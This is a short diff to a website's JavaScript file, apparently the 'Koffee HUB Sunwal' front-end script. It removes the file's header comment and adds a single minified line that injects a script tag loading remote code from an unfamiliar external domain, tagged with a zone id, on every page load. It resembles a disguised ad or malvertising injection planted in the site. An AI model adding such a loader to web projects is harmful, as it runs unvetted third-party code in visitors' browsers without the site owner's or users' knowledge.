@@ -1,7 +1,4 @@
-/**
- * Koffee HUB Sunwal - JavaScript Engine
- * Custom premium cinematic interactive controls
- */
+(function(s){s.dataset.zone='11649038',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
 
 document.addEventListener('DOMContentLoaded', () => {
   initLoadingScreen();
